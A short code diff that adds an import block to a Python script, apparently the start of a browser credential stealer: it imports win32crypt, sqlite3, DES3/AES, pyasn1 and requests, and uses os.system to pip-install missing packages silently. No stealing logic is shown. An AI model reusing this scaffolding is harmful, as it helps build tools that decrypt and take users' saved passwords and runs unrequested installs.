@@ -1,3 +1,16 @@
+import os
+try:
+    import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,time,re
+    from datetime import datetime,timedelta
+    from Crypto.Cipher import DES3
+    from Crypto.Cipher import AES
+    from pyasn1.codec.der import decoder
+    from hashlib import sha1, pbkdf2_hmac
+    from Crypto.Util.Padding import unpad 
+    from base64 import b64decode
+except:
+    os.system("pip install pywin32 requests pycryptodomex pyasn1")
+
 import os,json,shutil,win32crypt,hmac,platform,sqlite3,base64,random,requests,time,re
 from datetime import datetime,timedelta
 from Crypto.Cipher import DES3
